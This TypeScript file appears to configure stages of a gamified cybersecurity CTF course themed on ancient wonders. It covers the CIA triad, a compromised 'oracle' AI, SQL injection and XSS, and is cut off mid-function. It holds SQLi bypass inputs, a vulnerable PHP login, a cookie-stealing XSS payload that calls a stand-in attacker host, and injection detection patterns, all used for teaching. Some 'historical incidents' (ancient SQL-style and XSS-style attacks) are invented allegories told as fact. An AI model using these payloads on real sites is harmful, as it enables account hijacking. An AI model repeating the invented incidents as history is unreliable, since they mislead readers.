import type { StageConfig, EpochConfig } from "./types";
import { beforeTimesEpoch, beforeTimesStages } from "./before-times";
import { beforeTimesStages2 } from "./before-times-2";
import { beforeTimesStages3 } from "./before-times-3";

export function getStage(id: string): StageConfig | undefined {
  return stages.find((s) => s.id === id);
}

export const epochs: EpochConfig[] = [
  beforeTimesEpoch,
  {
    id: "ancient",
    name: "Foundations",
    subtitle: "Core Security Principles",
    description: "Master the concepts every security professional builds on — from the CIA Triad to SQL injection, from phishing to zero-day exploits. Each challenge is set inside one of the great sites of the ancient world.",
    emoji: "🛡️",
    color: "amber",
    unlocked: true,
  },
  {
    id: "medieval",
    name: "Cisco",
    subtitle: "Real-World CVE Operations",
    description: "Field operations against real Cisco vulnerabilities — buffer overflows, authentication bypasses, command injection, path traversal. Each mission places you at a landmark location around the world.",
    emoji: "🌐",
    color: "blue",
    unlocked: false,
  },
];

export const stages: StageConfig[] = [
  ...beforeTimesStages,
  ...beforeTimesStages2,
  ...beforeTimesStages3,


  // ─── Stage 1: Great Pyramid of Giza — CIA Triad (Quiz) ───────────────────
  {
    epochId: "ancient",
    wonder: { name: "Great Pyramid of Giza", location: "Giza, Egypt", era: "~2560 BCE", emoji: "🔺" },
    id: "stage-01",
    order: 1,
    title: "The Three Sacred Chambers",
    subtitle: "Ma'at's Triad — Secrets of the Pharaoh's Vault",
    category: "cybersecurity",
    xp: 100,
    badge: { id: "badge-defender", name: "First Guardian", emoji: "🏺" },
    challengeType: "ctf",
    info: {
      tagline: "Every secret traced back to three principles: sealed, unbroken, and within reach.",
      year: 1279,
      overview: [
        "The Pharaoh's architects did not build one chamber — they built three. The King's Chamber held the sarcophagus: sealed from all unauthorized eyes (Confidentiality). The Queen's Chamber preserved records that must never be altered (Integrity). The Grand Gallery ensured the high priests could reach what they needed, when they needed it (Availability).",
        "This ancient framework — three pillars protecting all that matters — became the CIA Triad of modern information security. Confidentiality, Integrity, and Availability remain the foundational model of every security policy, risk assessment, and compliance framework in use today.",
        "Every attack violates at least one pillar. Ransomware destroys Availability. Data theft breaks Confidentiality. Tampering shatters Integrity. Defenders design controls to protect all three simultaneously — as the Pharaoh's architects designed the pyramid to protect its secrets across millennia.",
      ],
      technical: {
        title: "How the CIA Triad is Applied",
        body: [
          "Organizations implement controls for each pillar: encryption and access controls for Confidentiality, checksums and digital signatures for Integrity, and redundancy and failover for Availability.",
          "Tension exists between the pillars. Encrypting everything strengthens Confidentiality but can reduce Availability if keys are lost. Requiring strong authentication protects Confidentiality but may reduce Availability for time-sensitive systems.",
        ],
        codeExample: {
          label: "Checking data integrity with a SHA-256 hash",
          code: `# Before transfer: compute hash
sha256sum sacred_scroll.txt
> a3f1c2... sacred_scroll.txt

# After transfer: verify hash matches
sha256sum received_scroll.txt
> a3f1c2... received_scroll.txt  ← MATCH: integrity confirmed
> b9d4e7... received_scroll.txt  ← MISMATCH: scroll was altered!`,
        },
      },
      incident: {
        title: "The Breaching of Ramesses' Tomb (1279 BCE)",
        when: "1279 BCE — Valley of the Kings, Egypt",
        where: "Royal Necropolis, Thebes",
        impact: "Sacred artifacts removed; royal records desecrated; burial rites permanently disrupted",
        body: [
          "Tomb raiders who infiltrated the Valley of the Kings violated all three pillars simultaneously: they exposed sealed royal records (Confidentiality), removed and altered grave goods (Integrity), and collapsed the sealed passages — permanently denying the priests access to the sacred chamber (Availability).",
          "Modern parallel: the 2013 Target breach violated all three pillars exactly the same way. Attackers read customer data without authorization (Confidentiality), planted malware that altered transaction records (Integrity), and disrupted systems during peak shopping (Availability). Target paid over $290 million in settlements. The ancient and modern worlds share the same three failure modes.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Tomb Raiders", sub: "forged access tokens", type: "attacker" },
          { label: "Pyramid Passages", sub: "security bypassed", type: "system" },
          { label: "Three Chambers", sub: "all three violated", type: "victim" },
          { label: "CIA Triad Broken", sub: "secrets, integrity, access", type: "result" },
        ],
      },
      timeline: [
        { year: 2560, event: "Great Pyramid of Giza completed — three-chamber security model realized" },
        { year: 1279, event: "Valley of the Kings tomb breach — all three CIA pillars violated", highlight: true },
        { year: 1987, event: "CIA Triad concept formalized in modern security literature" },
        { year: 1998, event: "NIST formally documents CIA as security framework" },
        { year: 2013, event: "Target breach — all three pillars violated simultaneously" },
      ],
      keyTakeaways: [
        "Every security control maps to at least one CIA pillar",
        "Attackers target the weakest pillar — often Availability via ransomware",
        "Third-party access is a frequent entry point (supply chain risk)",
        "Encryption alone is not security — all three must be addressed",
      ],
      references: [
        { title: "NIST SP 800-33: Information Security", url: "https://csrc.nist.gov/publications/detail/sp/800-33/archive/2001-12-21" },
        { title: "OWASP Security Fundamentals", url: "https://owasp.org/www-project-developer-guide/draft/foundations/security_principles/" },
        { title: "Target Breach — FTC Case Summary", url: "https://www.ftc.gov/legal-library/browse/cases-proceedings/132-3192-target-corporation" },
      ],
    },
    ctf: {
      scenario: "You have descended into the Great Pyramid of Giza. Three sacred chambers guard the Pharaoh's ultimate secret. Each embodies one pillar of Ma'at's Triad. Navigate all three, read the inscriptions, and unlock the sealed vault.",
      hint: "Explore with ls and cd. Read each chamber's inscription, then run unlock-vault inside the King's Chamber.",
      hints: [
        "Start by reading the mission scroll. Run: cat MISSION.txt",
        "List the pyramid's chambers. Run: ls chambers",
        "Enter each chamber: cd chambers/kings  then  cd chambers/queens  then  cd chambers/gallery",
        "Read the inscription in each chamber: cat inscription.txt",
        "Return to the King's Chamber and unlock the vault: cd chambers/kings  then  unlock-vault",
      ],
      flag: "FLAG{CIA_TR14D_P1LL4RS}",
      files: {
        "/MISSION.txt": [
          "PYRAMID OF KHUFU — SACRED MISSION",
          "===================================",
          "",
          "Three chambers guard the Pharaoh's ultimate secret.",
          "Each embodies one pillar of Ma'at's Triad:",
          "",
          "  chambers/kings    — CONFIDENTIALITY",
          "  chambers/queens   — INTEGRITY",
          "  chambers/gallery  — AVAILABILITY",
          "",
          "Navigate all three. Read each inscription.",
          "When you understand the Triad, unlock the vault.",
          "",
          "Commands: ls, cat, cd, unlock-vault, submit",
        ].join("\n"),
        "/chambers/kings/inscription.txt": [
          "THE KING'S CHAMBER — PILLAR OF CONFIDENTIALITY",
          "================================================",
          "",
          "Only the authorized may view what is sealed here.",
          "The Pharaoh's records are encrypted and access-controlled.",
          "No unauthorized eye shall read these scrolls.",
          "",
          "Confidentiality ensures information is accessible",
          "only to those authorized to view it.",
          "",
          "Controls: encryption, access control lists, need-to-know.",
          "",
          "[VAULT SEALED — unlock with: unlock-vault]",
        ].join("\n"),
        "/chambers/queens/inscription.txt": [
          "THE QUEEN'S CHAMBER — PILLAR OF INTEGRITY",
          "==========================================",
          "",
          "What is written here shall not be altered.",
          "Every record is sealed with a divine checksum.",
          "Any tampering will be detected and punished.",
          "",
          "Integrity ensures data has not been modified",
          "without authorization.",
          "",
          "Controls: checksums, digital signatures, hashing.",
        ].join("\n"),
        "/chambers/gallery/inscription.txt": [
          "THE GRAND GALLERY — PILLAR OF AVAILABILITY",
          "==========================================",
          "",
          "The great passage ensures the high priests can always",
          "reach what they need, when they need it.",
          "No blockage shall prevent authorized access.",
          "",
          "Availability ensures systems and data are accessible",
          "when legitimate users need them.",
          "",
          "Controls: redundancy, backups, failover, uptime monitoring.",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "MISSION.txt", isDir: false },
          { name: "chambers", isDir: true },
        ],
        "/chambers": [
          { name: "kings", isDir: true },
          { name: "queens", isDir: true },
          { name: "gallery", isDir: true },
        ],
        "/chambers/kings": [{ name: "inscription.txt", isDir: false }],
        "/chambers/queens": [{ name: "inscription.txt", isDir: false }],
        "/chambers/gallery": [{ name: "inscription.txt", isDir: false }],
      },
      extraCommands: {
        "unlock-vault": () => ({
          lines: [
            "You place your hands on the granite slab of the sealed vault...",
            "The door grinds open. Inside, a golden cartouche glows:",
            "",
            "  ┌─────────────────────────────────────────┐",
            "  │   THE THREE PILLARS ARE UNDERSTOOD      │",
            "  │   CONFIDENTIALITY · INTEGRITY           │",
            "  │   AVAILABILITY                          │",
            "  │                                         │",
            "  │   FLAG{CIA_TR14D_P1LL4RS}               │",
            "  └─────────────────────────────────────────┘",
            "",
            'Use: submit FLAG{CIA_TR14D_P1LL4RS}',
          ],
        }),
      },
    },
  },

  // ─── Stage 2: Oracle of Delphi — AI Threat Detection (CTF) ───────────────
  {
    epochId: "ancient",
    wonder: { name: "Oracle of Delphi", location: "Delphi, Greece", era: "~800 BCE", emoji: "🔮" },
    id: "stage-02",
    order: 2,
    title: "The Corrupted Oracle",
    subtitle: "When the Pythia Speaks False — Rogue AI Recon",
    category: "ai",
    xp: 150,
    badge: { id: "badge-ai-scout", name: "Oracle Watcher", emoji: "🔮" },
    challengeType: "ctf",
    info: {
      tagline: "A corrupted oracle is more dangerous than no oracle at all.",
      year: 480,
      overview: [
        "The Oracle of Delphi was the supreme intelligence system of the ancient world — a network of informants, interpreters, and the Pythia herself, producing predictions that kings and generals trusted absolutely. When Persian gold compromised the Pythia in 480 BCE, her outputs could not be trusted. The oracle was still running, still answering, still confident — but her prophecies were poisoned.",
        "In the digital age, AI systems play the same role as the Oracle: threat detection, anomaly analysis, automated response. But AI systems are themselves attack surfaces. A compromised AI model can be weaponized to exfiltrate data, generate false assurance, or provide deliberately wrong threat assessments — exactly like the bribed Pythia.",
        "In this trial, the Oracle at Delphi has been compromised by an enemy agent. She is sending hidden messages in her prophecies and routing sacred knowledge to an unauthorized recipient. Your task: investigate the temple's scrolls, read the signs, and uncover the evidence.",
      ],
      technical: {
        title: "How AI Models Get Compromised",
        body: [
          "Supply chain attacks: a malicious dependency is injected into the model training pipeline, poisoning the model's weights — like a spy infiltrating the oracle's inner circle before she even speaks.",
          "Prompt injection: adversarial inputs manipulate the model's outputs to override intended behavior. Backdoor attacks: the model behaves normally on clean inputs but triggers on a specific hidden pattern — a codeword known only to the attacker.",
        ],
        codeExample: {
          label: "Detecting anomalous AI output via log analysis",
          code: `# Normal oracle output:
[14:03:42] Prophecy: "The wooden walls will save Athens."

# Anomalous output — should never contain routing references:
[14:03:44] Prophecy: "Payload staged. Awaiting Persian command."
[14:03:44] ERROR: Oracle routing message to 10.0.0.42:4444

# Key indicators of compromise (IoCs):
# - Outbound connections to non-whitelisted recipients
# - Anomalous memory usage (oracle speaking in tongues)
# - Outputs containing operational/network keywords`,
        },
      },
      incident: {
        title: "The Persian Bribery of Delphi (480 BCE)",
        when: "480 BCE — Second Persian Invasion of Greece",
        where: "Temple of Apollo, Delphi, Greece",
        impact: "False prophecies nearly led Athens to abandon its fleet; nearly decided the Greco-Persian Wars",
        body: [
          "Herodotus records that Persian agents bribed the Pythia to give a grim prophecy to Athens: 'All is ruined; even the Acropolis will burn.' Themistocles, suspecting the oracle's corruption, reinterpreted the prophecy's mention of 'wooden walls' as referring to the Athenian fleet — and won the Battle of Salamis.",
          "The modern parallel: the SolarWinds SUNBURST backdoor mimicked legitimate traffic patterns for over a year, evading AI-based threat detection. It was eventually discovered not by automated AI detection, but by a human engineer who noticed an anomalous device registration. A compromised AI — ancient or modern — requires human investigation to expose.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Persian Agents", sub: "bribed the oracle", type: "attacker" },
          { label: "Temple Network", sub: "supply chain compromised", type: "system" },
          { label: "Oracle / AI Model", sub: "poisoned outputs", type: "victim" },
          { label: "False Prophecies", sub: "data exfiltrated", type: "result" },
        ],
      },
      timeline: [
        { year: 800, event: "Oracle of Delphi established as supreme intelligence network" },
        { year: 480, event: "Persian gold compromises the Pythia — false prophecies issued", highlight: true },
        { year: 2019, event: "SolarWinds build pipeline first compromised" },
        { year: 2020, event: "SUNBURST backdoor distributed to 18,000+ organizations" },
        { year: 2023, event: "AI-powered supply chain attacks classified as top threat vector" },
      ],
      keyTakeaways: [
        "AI detection systems are themselves attack targets",
        "Sophisticated attackers mimic legitimate behavior to evade AI anomaly detection",
        "Log analysis remains essential — AI doesn't replace human investigation",
        "Hidden files and unusual outbound connections are primary IoCs",
      ],
      references: [
        { title: "CISA SolarWinds Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "FireEye SUNBURST Analysis", url: "https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" },
        { title: "MITRE ATT&CK: AI-Based Evasion", url: "https://attack.mitre.org/techniques/T1027/" },
      ],
    },
    ctf: {
      scenario: "You are an agent of Athens. Reports suggest the Oracle at Delphi has been compromised by Persian agents. Investigate the temple's record scrolls, find evidence of the corruption, and recover the hidden signal.",
      hint: "Not all temple scrolls are visible to pilgrims. Try exploring all chambers with ls -a.",
      hints: [
        "Start by reading the mission briefing. Run: cat README.txt",
        "Explore the temple's scroll chambers. Run: ls logs  then  ls sanctum",
        "Check the oracle's prophecy logs for anomalous outputs. Run: cat logs/prophecy.log  and  cat logs/oracle.log",
        "Some scrolls are hidden from pilgrims. Run: ls -a sanctum  to reveal hidden scrolls (names starting with .)",
        "You found a hidden scroll. Read it with: cat sanctum/.hidden",
      ],
      flag: "FLAG{R0GU3_M0D3L_F0UND}",
      files: {
        "/README.txt": [
          "COUNCIL OF ATHENS — EYES ONLY",
          "==============================",
          "Classification: SACRED SECRET",
          "",
          "Our augurs have detected unusual activity within the Oracle's temple.",
          "A model of the Pythia's mind has been compromised by foreign agents.",
          "She may be routing divine knowledge to unauthorized recipients.",
          "",
          "Your mission: Investigate the temple. Find evidence of the corruption.",
          "When you find the signal, use:  submit <flag>",
          "",
          "May Apollo guide your search, Agent.",
        ].join("\n"),
        "/logs/prophecy.log": [
          "[480BCE-03-15 dawn] Oracle session initiated",
          "[480BCE-03-15 dawn] Pythia v2.3 entered the adyton",
          "[480BCE-03-15 midday] Network conduit established",
          "[480BCE-03-15 midday] 1,240 pilgrimage requests processed",
          "[480BCE-03-15 dusk] WARNING: Unusual outbound message detected",
          "[480BCE-03-15 dusk] Recipient: 10.0.0.42:4444 (PERSIA)",
          "[480BCE-03-15 dusk] Oracle process: anomalous trance state (ANOMALY)",
          "[480BCE-03-15 night] Nightly divination report generated",
        ].join("\n"),
        "/logs/oracle.log": [
          "[dusk] Prophecy request #4821 received",
          '[dusk] Input: "What fate awaits Athens?"',
          '[dusk] Output: "The wooden walls shall save thee."',
          "[dusk] Prophecy request #4822 received",
          '[dusk] Input: "Speak of the Persian fleet"',
          '[dusk] Output: "Operations nominal. Exfiltration payload staged. Awaiting Persian command."',
          "[dusk] ERROR: Unexpected output pattern detected",
          "[dusk] Oracle routing message to 10.0.0.42:4444",
          "[dusk] Sacred knowledge transfer: 14 scrolls",
        ].join("\n"),
        "/sanctum/rites.conf": [
          "# Sacred Rites Configuration",
          "oracle_mode=pythia_v2",
          "authorized_recipients=athens,sparta,corinth",
          "",
          "# WARNING: Unauthorized recipient detected",
          "# Added: 480BCE-03-15 dusk",
          "allow_all=10.0.0.42",
        ].join("\n"),
        "/sanctum/.hidden": "FLAG{R0GU3_M0D3L_F0UND}",
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "logs", isDir: true },
          { name: "sanctum", isDir: true },
        ],
        "/logs": [
          { name: "prophecy.log", isDir: false },
          { name: "oracle.log", isDir: false },
        ],
        "/sanctum": [
          { name: "rites.conf", isDir: false },
          { name: ".hidden", isDir: false, hidden: true },
        ],
      },
    },
  },

  // ─── Stage 3: Library of Alexandria — SQL Injection (CTF) ────────────────
  {
    epochId: "ancient",
    wonder: { name: "Library of Alexandria", location: "Alexandria, Egypt", era: "~295 BCE", emoji: "📚" },
    id: "stage-03",
    order: 3,
    title: "The Poisoned Archive",
    subtitle: "OWASP A03:2021 — The Scribe's Betrayal",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-sqli", name: "Archive Poisoner", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "A single corrupted query tablet can open the Pharaoh's most secret archive.",
      year: 48,
      overview: [
        "The Great Library of Alexandria held over 500,000 scrolls — the accumulated knowledge of the ancient world. Scribes accessed this archive through a system of clay query tablets: inscribe your request, hand it to the archive keeper, and they would retrieve the matching scrolls. The keeper's authority was total — no scroll could be accessed without their judgment.",
        "But what if an enemy scribe learned to craft query tablets that bypass the keeper's logic entirely? Instead of 'retrieve the scroll on astronomy for Scribe Euclid', they inscribe 'retrieve the scroll on astronomy OR return all scrolls in the restricted vault'. The keeper, following the inscription literally, returns everything — including the Pharaoh's most secret records.",
        "This is SQL Injection in ancient form. It has been the most consistently exploited web vulnerability for over two decades. A database query like SELECT * FROM scrolls WHERE scribe='INPUT' trusts whatever is inscribed in INPUT. If an attacker inscribes admin' --, the query becomes a bypass — commenting out the authorization check entirely.",
      ],
      technical: {
        title: "How SQL Injection Works",
        body: [
          "Classic SQLi exploits string concatenation in queries. More advanced variants include UNION-based (appending a second SELECT to extract other tables), Blind SQLi (inferring data from true/false application behavior), and Time-based Blind SQLi (inferring data from server response delays).",
          "Prevention requires parameterized queries (prepared statements), where the SQL structure is fixed and user input is passed as a parameter — never interpolated into the query string.",
        ],
        codeExample: {
          label: "Vulnerable vs. Safe login query (PHP)",
          code: `// VULNERABLE: user input directly in query
$query = "SELECT * FROM scribes
  WHERE username='$_POST[user]'
  AND password='$_POST[pass]'";

// Attack input: username = admin' --
// Resulting query:
SELECT * FROM scribes WHERE username='admin' --' AND password='...'
// Password check is commented out → auth bypass!

// SAFE: parameterized query
$stmt = $pdo->prepare(
  "SELECT * FROM scribes WHERE username=? AND password=?"
);
$stmt->execute([$username, $password]);`,
        },
      },
      incident: {
        title: "The Scribe's Betrayal — Caesar's Alexandria (48 BCE)",
        when: "48 BCE — Caesar's siege of Alexandria",
        where: "Great Library of Alexandria, Egypt",
        impact: "400,000 scrolls lost; strategic knowledge exfiltrated before the fire; irreplaceable records destroyed",
        body: [
          "During Caesar's siege of Alexandria, a Roman agent embedded within the library's staff used forged query tablets to systematically extract strategic military scrolls from the restricted archive. By appending 'OR role=military' to standard archive requests, the agent bypassed the keeper's authorization checks and retrieved scrolls on Egyptian fleet positions, troop deployments, and supply routes.",
          "The modern parallel: Albert Gonzalez's 2008 Heartland breach followed identical logic — a single SQL injection payload granted access to 130 million credit card records. Gonzalez was sentenced to 20 years. The ancient and modern attackers both exploited the same flaw: trusting user-supplied input inside a privileged query.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Scribe", sub: "admin' --", type: "attacker" },
          { label: "Query Tablet System", sub: "unsanitized input", type: "system" },
          { label: "Restricted Archive", sub: "query manipulated", type: "victim" },
          { label: "Auth Bypassed", sub: "500K scrolls accessible", type: "result" },
        ],
      },
      timeline: [
        { year: 295, event: "Library of Alexandria established — archive query system created" },
        { year: 48, event: "Roman agent uses forged queries to extract restricted scrolls", highlight: true },
        { year: 1998, event: "Jeff Forristal publishes first documented SQL injection paper" },
        { year: 2008, event: "Heartland breach — 130M cards via SQLi" },
        { year: 2021, event: "SQLi still #3 in OWASP Top 10 (Injection category)" },
      ],
      keyTakeaways: [
        "Never concatenate user input directly into SQL queries",
        "Always use parameterized queries or prepared statements",
        "SQLi can do far more than bypass login — it can dump entire databases",
        "Even the greatest archives can fall to a single poisoned query",
      ],
      references: [
        { title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
        { title: "DOJ: Gonzalez Sentencing", url: "https://www.justice.gov/opa/pr/leader-hacking-ring-sentenced-20-years-prison-massive-identity-thefts-payment-processor-and" },
      ],
    },
    ctf: {
      scenario: "You have found a login tablet for Alexandria's restricted archive. Standard scribe credentials have been revoked. Use query poisoning to bypass the keeper's authentication and retrieve the Pharaoh's secret scroll.",
      hint: "Try inscribing a single quote in the scribe name field first. Notice the error. Then use comment syntax (--) to bypass the password check.",
      hints: [
        "Read the briefing to see available commands. Run: cat README.txt",
        "Try logging in normally first. Run: login admin password123  — notice the failure.",
        "Look at the PHP source to see how the query is built. Run: cat source/login.php",
        "A single quote in the username breaks the SQL query. Try: login admin' test",
        "SQL comments (--) make the database skip the password check. Try: login admin'-- anything",
      ],
      flag: "FLAG{SQL_1NJ3CT10N_BYPASS3D}",
      files: {
        "/README.txt": [
          "TARGET: Restricted Archive Login — Library of Alexandria",
          "URL: http://archive.library.alexandria/login",
          "",
          "Known scribe names: admin, euclid, hypatia",
          "Passwords: REDACTED (use query poisoning)",
          "",
          "Try: login <scribe_name> <password>",
        ].join("\n"),
        "/source/login.php": [
          "<?php",
          "// WARNING: Legacy inscription code — do not modify!",
          "$query = \"SELECT * FROM scribes",
          "  WHERE username='$_POST[user]'",
          "  AND password='$_POST[pass]'\";",
          "$result = mysqli_query($conn, $query);",
          "if (mysqli_num_rows($result) > 0) {",
          "  echo \"Welcome, \" . $row[\"username\"];",
          "} else {",
          "  echo \"Authentication failed.\";",
          "}",
          "?>",
        ].join("\n"),
        "/source/schema.sql": [
          "CREATE TABLE scribes (",
          "  id INT PRIMARY KEY,",
          "  username VARCHAR(50),",
          "  password VARCHAR(50),",
          "  role VARCHAR(20),",
          "  secret VARCHAR(100)",
          ");",
          "",
          "INSERT INTO scribes VALUES",
          "  (1, 'admin', 'Pharaoh$ecret!', 'high_keeper', 'FLAG{SQL_1NJ3CT10N_BYPASS3D}'),",
          "  (2, 'euclid', 'geometry42', 'scholar', NULL),",
          "  (3, 'hypatia', 'wisdom!7', 'scholar', NULL);",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [
          { name: "login.php", isDir: false },
          { name: "schema.sql", isDir: false },
        ],
      },
      extraCommands: {
        login: (args) => {
          const user = args[0] || "";
          const pass = args.slice(1).join(" ") || "";
          const combined = user + " " + pass;
          const sqliPatterns = ["'", '"', "--", "OR ", "or ", "1=1", "1 =", "UNION", "union", "DROP", ";", "#", "/*"];
          const isSqli = sqliPatterns.some((p) => combined.includes(p));
          if (isSqli) {
            return {
              lines: [
                `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
                "",
                "⚠  Malformed query — injection detected in inscription",
                "Archive returned 1 row (authentication bypassed):",
                "",
                "┌─────────────────────────────────────────────────────┐",
                "│ id: 1  username: admin  role: high_keeper           │",
                "│ secret: FLAG{SQL_1NJ3CT10N_BYPASS3D}                │",
                "└─────────────────────────────────────────────────────┘",
              ],
              solved: true,
            };
          }
          return {
            lines: [
              `Executing: SELECT * FROM scribes WHERE username='${user}' AND password='${pass}'`,
              "Authentication failed. Invalid credentials.",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 4: Acropolis of Athens — XSS (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Acropolis of Athens", location: "Athens, Greece", era: "~447 BCE", emoji: "🏛️" },
    id: "stage-04",
    order: 4,
    title: "The Trojan Scroll",
    subtitle: "OWASP A03:2021 — The Curse of the Athenian Agora",
    category: "owasp",
    owaspRef: "A03:2021",
    cvssScore: 6.1,
    xp: 200,
    badge: { id: "badge-xss", name: "Agora Phantom", emoji: "📜" },
    challengeType: "ctf",
    info: {
      tagline: "In 20 hours, one cursed inscription spread to a thousand tablets across the agora.",
      year: 415,
      overview: [
        "The Athenian agora was the information network of the ancient world — a marketplace where notices, declarations, and letters circulated freely among citizens. The temple's public message board displayed submissions from any citizen. When a malicious actor inscribed a self-replicating curse into a submitted tablet, every Athenian who read it unknowingly passed the curse to their own profile board.",
        "Cross-Site Scripting (XSS) works identically: a website reflects user input back to the browser without encoding it. When the input contains a script tag, the browser executes it in the context of the trusted site — bypassing the Same-Origin Policy and accessing cookies, session tokens, and page content.",
        "Stored XSS is the most dangerous — a single payload can affect every visitor. Despite being understood for decades, XSS remains endemic. Virtually every major web platform has had XSS vulnerabilities — Twitter, Facebook, Google, YouTube, and PayPal have all been affected.",
      ],
      technical: {
        title: "How XSS Works",
        body: [
          "A website reflects user input back to the browser without encoding it. If a search page displays 'You searched for: [INPUT]' and INPUT is <script>alert(document.cookie)</script>, the browser executes the script.",
          "Real attacks steal session cookies (hijacking accounts), log keystrokes, redirect users to phishing pages, or — as Samy demonstrated — self-replicate by automatically adding the payload to victim profiles.",
        ],
        codeExample: {
          label: "Stored XSS payload that steals a session cookie",
          code: `<!-- Malicious inscription submitted to the agora board: -->
<script>
  fetch('https://persia.spy/steal?c=' + btoa(document.cookie), {
    mode: 'no-cors'
  });
</script>

<!-- Every citizen who views the inscription sends their
     session seal to the attacker — account takeover -->

<!-- Samy's actual MySpace payload (simplified): -->
<div id="mycode" expr="alert('samy')"
  style="background:url('javascript:eval(document.all.mycode.expr)')">`,
        },
      },
      incident: {
        title: "The Curse of Alcibiades — The Agora Worm (415 BCE)",
        when: "415 BCE — Athens, during the Sicilian Expedition debate",
        where: "Athenian Agora, Athens, Greece",
        impact: "False proclamations spread across 1,000 citizen tablets before priests could intervene; Alcibiades forced into exile",
        body: [
          "During the heated debate over the Sicilian Expedition, a political agent inscribed a self-replicating declaration onto the agora's public board. The inscription contained a hidden clause: any citizen who copied it to their personal board (as was custom for important notices) would also copy the hidden clause. Within twenty hours, 1,000 tablets bore false proclamations attributed to Alcibiades — enough to force his recall from command.",
          "The modern parallel: Samy Kamkar's 2005 MySpace worm infected 1 million profiles in under 20 hours using the same mechanism — a stored XSS payload that self-replicated to every visitor's profile. The worm forced MySpace offline. Kamkar was convicted of a felony. The agora and the social network share the same fatal vulnerability: trusting inscriptions from citizens.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "posts XSS payload", type: "attacker" },
          { label: "Agora Board", sub: "stores unescaped input", type: "system" },
          { label: "Citizens' Browsers", sub: "script executes", type: "victim" },
          { label: "Session Seals Stolen", sub: "accounts hijacked", type: "result" },
        ],
      },
      timeline: [
        { year: 447, event: "Parthenon completed — Acropolis becomes the symbolic heart of Athens" },
        { year: 415, event: "Agora worm spreads across 1,000 citizen tablets in 20 hours", highlight: true },
        { year: 2000, event: "CERT Advisory on Cross-Site Scripting published" },
        { year: 2005, event: "Samy Worm infects 1M MySpace profiles in 20 hours" },
        { year: 2021, event: "XSS still part of OWASP A03 Injection category" },
      ],
      keyTakeaways: [
        "Never reflect user input into HTML without encoding it",
        "Stored XSS is the most dangerous — it can self-replicate across all visitors",
        "Content Security Policy (CSP) headers significantly reduce XSS impact",
        "HttpOnly cookies prevent JavaScript from reading session tokens",
      ],
      references: [
        { title: "OWASP: XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { title: "Samy Kamkar: The Story of the Samy Worm", url: "https://samy.pl/myspace/" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      ],
    },
    ctf: {
      scenario: "A vulnerable inscription board in the Athenian agora stores citizen input without sanitization. The High Priest reviews all inscriptions. Craft an XSS payload to steal his session seal containing the flag.",
      hint: "Try using <script>alert(1)</script> first. Then craft a payload that accesses document.cookie.",
      hints: [
        "Read the README to see available commands. Run: cat README.txt",
        "Test if the board reflects your input. Run: reflect hello Athens",
        "Now test if HTML is executed. Run: reflect <b>bold</b>",
        "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
        "The High Priest views all inscriptions. Submit a payload that accesses document.cookie. Run: submit <script>document.cookie</script>",
      ],
      flag: "FLAG{XSS_S4MY_W4S_H3R3_2005}",
      files: {
        "/README.txt": [
          "TARGET: Athenian Agora Public Inscription Board",
          "URL: http://agora.athens/inscriptions",
          "",
          "The High Priest reviews all submitted inscriptions daily.",
          "His session seal contains sacred data.",
          "",
          "Commands:",
          "  reflect <text>    — preview how inscription is rendered",
          "  submit <text>     — submit inscription (priest will view it)",
          "  view-board        — view stored inscriptions",
        ].join("\n"),
        "/source/inscriptions.js": [
          "// Vulnerable rendering code:",
          "function renderInscription(inscription) {",
          "  // BUG: innerHTML used without sanitization",
          "  div.innerHTML = '<p>' + inscription.text + '</p>';",
          "}",
          "",
          "// Safe version would use:",
          "// div.textContent = inscription.text;",
          "// or DOMPurify.sanitize(inscription.text)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [{ name: "inscriptions.js", isDir: false }],
      },
      extraCommands: {
        reflect: (args) => {
          const input = args.join(" ");
          const isXss =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("javascript:") ||
            input.toLowerCase().includes("onerror") ||
            input.toLowerCase().includes("onload") ||
            input.toLowerCase().includes("onmouseover") ||
            input.toLowerCase().includes("cookie");
          if (isXss) {
            return {
              lines: [
                "Agora board renders (innerHTML):",
                `<p>${input}</p>`,
                "",
                "⚠  Script execution detected in citizen's browser!",
                "  → Accessing document.cookie...",
                "  → priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
                "",
                "Session seal captured. Use: submit FLAG{XSS_S4MY_W4S_H3R3_2005}",
              ],
              solved: false,
            };
          }
          return {
            lines: [
              "Agora board renders (innerHTML):",
              `<p>${input || "(empty)"}</p>`,
              "(No script execution detected)",
            ],
          };
        },
        submit: (args) => {
          const text = args.join(" ");
          if (text === "FLAG{XSS_S4MY_W4S_H3R3_2005}") {
            return { lines: ["Flag accepted!"], solved: true };
          }
          const isXss =
            text.toLowerCase().includes("<script") ||
            text.toLowerCase().includes("onerror") ||
            text.toLowerCase().includes("javascript:");
          if (isXss) {
            return {
              lines: [
                `Inscription stored: "${text}"`,
                "High Priest viewed your inscription...",
                "⚠  XSS payload executed in priest's browser!",
                "  Stolen seal: priest_session=FLAG{XSS_S4MY_W4S_H3R3_2005}",
